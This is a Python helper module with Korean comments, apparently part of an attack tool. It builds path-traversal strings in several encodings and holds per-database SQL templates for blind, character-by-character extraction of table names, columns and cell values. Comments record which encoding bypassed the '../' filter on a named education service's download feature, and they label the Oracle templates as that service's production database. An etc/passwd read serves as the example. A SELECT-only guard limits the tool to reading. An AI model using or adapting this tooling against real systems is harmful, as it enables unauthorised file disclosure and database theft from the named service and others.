"""패턴을 만들 때 쓰는 공통 조각 — 인코딩, 경로 올라가기, DBMS 별 SQL 표현.

페이로드 자체는 모듈이 갖고, 여기에는 '어떻게 감싸고 바꿔 보낼지'만 둔다.
"""
# ── 인코딩 ────────────────────────────────────────────────────
# 서버가 ../ 를 지우거나 막을 때, 뜻은 같은데 글자가 다른 형태로 바꿔 보내 본다.
# 새싹에듀 자료 다운로드는 '../ 제거'를 URL 디코딩보다 먼저 해서,
# 한 번 더 감싸 두면 제거를 지나친 뒤 디코딩되어 ../ 로 되살아난다.
ENCODINGS = {
    "none": "그대로 (../)",
    "url": "URL 인코딩 (%2e%2e%2f)",
    "double": "이중 인코딩 (%252e%252e%252f)",
    "double-full": "이중 인코딩·모든 글자 (%25%32%65…) — 새싹에듀에서 통한 형태",
    "dots": "점만 인코딩 (%2e%2e/)",
}


def _pct(text: str) -> str:
    """글자 하나하나를 % 형태로 바꾼다. %2e 의 % 2 e 까지 전부 바꾼다."""
    return "".join(f"%{b:02x}" for b in text.encode())


def encode(value: str, scheme: str = "none") -> str:
    """경로 조각 하나를 scheme 방식으로 바꾼다."""
    if scheme == "none":
        return value
    if scheme == "url":
        return _pct(value)
    if scheme == "double":
        return _pct(value).replace("%", "%25")
    if scheme == "double-full":
        return _pct(_pct(value))
    if scheme == "dots":
        return value.replace(".", "%2e")
    raise ValueError(f"모르는 인코딩: {scheme}")


# 쿼리스트링 안에서 뜻이 달라지는 글자. 경로에 들어 있으면 그대로 보낼 수 없다.
#   '+'  → 서버가 공백으로 읽는다. /opt/java/jdk-11.0.24+8 이 404 로 오던 원인이다(11-04 실측)
#   '&'  → 다음 파라미터가 시작된 것으로 읽는다
#   '='  → 이름과 값의 경계로 읽는다
#   '#'  → 프래그먼트가 시작돼 뒤가 서버까지 가지 않는다
#   '?'  → 두 번째 물음표
#   ';'  → 옛 규약에서 파라미터 구분자로 읽는 서버가 있다
#   ' '  → 그대로 보낼 수 없다
#   '%'  → 뒤 두 글자를 16진수로 읽어 엉뚱한 글자가 된다
UNSAFE_IN_QUERY = "+&=#?; %"


def _safe_in_query(path: str, scheme: str) -> str:
    """경로 본문에서 쿼리스트링을 깨는 글자만 골라 바꾼다.

    `/` 같은 보통 글자는 **그대로 둔다** — 11-03 실측에 쓴 스크립트가 그 형태이고,
    서버도 쿼리 값 안의 `/` 를 그냥 받는다. 여기서 손대는 것은 안 바꾸면 **뜻이
    달라지는** 글자뿐이다.

    바꾸는 방식은 ../ 에 쓴 것과 맞춘다. 서버가 '../ 제거 → 디코딩' 순서로 처리하므로,
    한 번만 감싸면 제거 단계에서 이미 풀려 버려 경로가 어긋난다.
    """
    if scheme in ("none", "dots"):          # 감싸지 않는 방식은 경로도 건드리지 않는다
        return path
    wrap = {"url": _pct, "double": lambda c: _pct(c).replace("%", "%25"),
            "double-full": lambda c: _pct(_pct(c))}[scheme]
    return "".join(wrap(c) if c in UNSAFE_IN_QUERY else c for c in path)


def traversal(path: str, depth: int = 9, scheme: str = "none") -> str:
    """읽으려는 경로를 '위로 올라가는' 형태로 만든다.

    path='etc/passwd', depth=3, scheme='url' → %2e%2e%2f×3 + etc/passwd
    depth 는 저장 폴더에서 몇 단계 위로 올라갈지다. 모르면 넉넉히 준다
    (이미 최상위면 더 올라가도 최상위에 머문다).

    경로의 보통 글자는 바꾸지 않는다 — 걸러지는 것은 ../ 뿐이다. 다만 쿼리스트링
    안에서 뜻이 달라지는 글자(`+` 등)는 바꿔야 한다. 안 그러면 **있는 파일이
    없는 것처럼 404 로 돌아온다.**
    """
    return encode("../", scheme) * max(0, depth) + _safe_in_query(path.strip("/"), scheme)


# ── DBMS 별 표현 ──────────────────────────────────────────────
# 같은 질문이라도 DB 제품마다 쓰는 함수 이름이 다르다. 대상에 맞춰 골라 쓴다.
DBMS = {
    "oracle": {
        "label": "Oracle (새싹에듀 운영 DB)",
        "bytes": True,   # ASCII()/ORD() 가 한글을 UTF-8 바이트 묶음으로 준다
        "from": " FROM dual",
        "code": "ASCII(SUBSTR(({expr}), {pos}, 1))",
        "length": "LENGTH(({expr}))",
        # 목록의 n 번째 값 하나만 꺼낸다. 목록 SQL 은 컬럼 이름을 x 로 맞춰 둔다.
        "nth": "SELECT x FROM (SELECT x, ROWNUM rn FROM ({list})) WHERE rn = {n}",
        "tables": "SELECT table_name x FROM user_tables ORDER BY table_name",
        "columns": "SELECT column_name x FROM user_tab_columns WHERE table_name = UPPER('{table}') ORDER BY column_id",
        "count": "SELECT COUNT(*) FROM {table}",
        "cell": "SELECT x FROM (SELECT {col} x, ROWNUM rn FROM (SELECT {col} FROM {table} ORDER BY 1)) WHERE rn = {n}",
    },
    "mysql": {
        "label": "MySQL / MariaDB",
        "bytes": True,   # ASCII()/ORD() 가 한글을 UTF-8 바이트 묶음으로 준다
        "from": "",
        "code": "ORD(SUBSTR(({expr}), {pos}, 1))",
        "length": "CHAR_LENGTH(({expr}))",
        "nth": "SELECT x FROM ({list}) t_x LIMIT 1 OFFSET {n0}",
        "tables": "SELECT table_name x FROM information_schema.tables WHERE table_schema = DATABASE() ORDER BY table_name",
        "columns": "SELECT column_name x FROM information_schema.columns WHERE table_name = '{table}' ORDER BY ordinal_position",
        "count": "SELECT COUNT(*) FROM {table}",
        "cell": "SELECT {col} x FROM {table} ORDER BY 1 LIMIT 1 OFFSET {n0}",
    },
    "postgres": {
        "label": "PostgreSQL",
        "bytes": False,  # ASCII()/UNICODE() 가 글자 번호를 그대로 준다
        "from": "",
        "code": "ASCII(SUBSTR(({expr}), {pos}, 1))",
        "length": "LENGTH(({expr}))",
        "nth": "SELECT x FROM ({list}) t_x LIMIT 1 OFFSET {n0}",
        "tables": "SELECT table_name x FROM information_schema.tables WHERE table_schema = 'public' ORDER BY table_name",
        "columns": "SELECT column_name x FROM information_schema.columns WHERE table_name = '{table}' ORDER BY ordinal_position",
        "count": "SELECT COUNT(*) FROM {table}",
        "cell": "SELECT {col} x FROM {table} ORDER BY 1 LIMIT 1 OFFSET {n0}",
    },
    "sqlite": {
        "label": "SQLite (연습용 대상)",
        "bytes": False,  # ASCII()/UNICODE() 가 글자 번호를 그대로 준다
        "from": "",
        "code": "UNICODE(SUBSTR(({expr}), {pos}, 1))",
        "length": "LENGTH(({expr}))",
        "nth": "SELECT x FROM ({list}) t_x LIMIT 1 OFFSET {n0}",
        "tables": "SELECT name x FROM sqlite_master WHERE type = 'table' ORDER BY name",
        "columns": "SELECT name x FROM pragma_table_info('{table}') ORDER BY cid",
        "count": "SELECT COUNT(*) FROM {table}",
        "cell": "SELECT {col} x FROM {table} ORDER BY 1 LIMIT 1 OFFSET {n0}",
    },
}

DBMS_OPTIONS = [{"value": k, "label": v["label"]} for k, v in DBMS.items()]

# 읽기만 허용한다. 팀이 함께 쓰는 DB 라서 바꾸는 문장은 보내기 전에 막는다.
FORBIDDEN = ("INSERT", "UPDATE", "DELETE", "MERGE", "DROP", "ALTER",
             "CREATE", "TRUNCATE", "GRANT", "REVOKE", "EXEC", "CALL")


def ensure_select_only(sql: str) -> str:
    """SELECT 문인지 검사한다. 아니면 ValueError 로 막는다."""
    words = sql.upper().replace(";", " ").replace("(", " ").split()
    if not words or words[0] != "SELECT":
        raise ValueError(f"SELECT 문만 보낼 수 있습니다: {sql[:60]}")
    for w in words:
        if w.strip(",") in FORBIDDEN:
            raise ValueError(f"데이터를 바꾸는 낱말이 들어 있어 거부합니다: {w}")
    return sql.strip().rstrip(";").strip()
